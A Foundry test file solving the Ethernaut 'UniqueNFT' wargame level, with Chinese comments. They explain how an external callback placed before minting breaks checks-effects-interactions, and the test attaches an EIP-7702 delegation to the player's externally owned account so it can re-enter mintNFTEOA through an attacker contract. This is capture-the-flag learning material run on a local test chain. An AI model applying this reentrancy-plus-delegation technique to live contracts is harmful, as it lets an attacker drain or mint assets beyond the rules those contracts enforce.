// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {UniqueNFT} from "../../src/ethernaut/38_UniqueNFT/UniqueNFT.sol";
import {UniqueNFT_Factory} from "../../src/ethernaut/38_UniqueNFT/UniqueNFT_Factory.sol";
import {UniqueNFT_Attacker} from "./38_UniqueNFT_Attacker.sol";

contract UniqueNFT_Test is Test {
	address deployer = makeAddr("deployer");
	
	uint256 playerPrivateKey = 0x12345;
	address player = vm.addr(playerPrivateKey); // 从私钥推导地址
	
	UniqueNFT_Factory factory;
	UniqueNFT instContract;
	
	modifier checkSolvedByPlayer() {
		vm.startPrank(player, player);
		_;
		vm.stopPrank();
		_isSolved();
	}
	
	/**
	 * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
	 */
	function _isSolved() private view {
		if (factory.validateInstance(player)) {
			console.log("\x1b[33m%s\x1b[0m", ">>>>>>>>>>>>>> Congratulations, you have successfully completed the challenge >>>>>>>>>>>>>>");
		} else {
			revert(">>>>>>>>>>>>>> Sorry, you failed the challenge >>>>>>>>>>>>>>");
		}
	}
	
	/**
	 * SETS UP CHALLENGE - DO NOT TOUCH
	 */
	function setUp() public {
		startHoax(deployer);
		
		factory = new UniqueNFT_Factory();
		instContract = UniqueNFT(payable(factory.createInstance(player)));
		
		vm.stopPrank();
		
		vm.label(player, "player");
		vm.deal(address(player), 2 ether);
	}
	
	function test__Solution_UniqueNFT() public checkSolvedByPlayer {
		// CODE YOUR SOLUTION HERE
		// forge test --mt test__Solution_UniqueNFT -vv
	
		// 核心问题点：
		// function _mintNFT() private returns(uint256) {
		//    // 1. Checks ✓ - 检查用户是否已有 NFT
		//    require(balanceOf(msg.sender) == 0, "only one unique NFT allowed");
		//
		//    // 2. 更新 tokenId（这是状态变更 - Effects 的一部分）
		//    uint256 _tokenId = tokenId++;
		//
		//    // 3. **问题所在**：在 _mint（状态变更）之前进行了外部调用
		//    ERC721Utils.checkOnERC721Received(
		//        address(0),
		//        address(0),
		//        msg.sender,
		//        _tokenId,
		//        ""
		//    ); // ← 这里违反了 CEI！
		//
		//    // 4. 真正的状态变更（mint）在外链调用之后
		//    _mint(msg.sender, _tokenId);
		//
		//    return _tokenId;
		//}
		//
		// 以上漏洞代码，看起来只能使用`合约账户`破除`只能拥有一个nft`的限制。
		// 但是，mintNFTSmartContract 函数，使用了 nonReentrant 保护，故无法重入。
		// 但是，mintNFTEOA 函数，没有使用 nonReentrant 保护，但是，EOA 看似无法使用`checkOnERC721Received`回调。
		// 所以，此时 EIP7702 必须登场。即，把`EOA`伪装成为`合约账户`，来满足以上重入可能性。
		
		console.log("player", player);
		
		// 0️⃣ 部署`伪装者`合约
		UniqueNFT_Attacker attacker = new UniqueNFT_Attacker(instContract);
		
		// 1️⃣ 确认 player 是纯 EOA
		assertEq(player.code.length, 0);
		
		// 2️⃣ 附加 delegation（EIP-7702）
		vm.signAndAttachDelegation(address(attacker), playerPrivateKey);
		
		// 3️⃣ 确认 player 此时已变异，且 `使用player生成的UniqueNFT_Attacker`，它的存储槽需要重新填充。
		assertGt(player.code.length, 0);
		
		// 4️⃣ 用“player 地址”调用逻辑
		UniqueNFT_Attacker(payable(address(player))).doAttack(instContract);
		
		vm.stopPrank();
	}
}
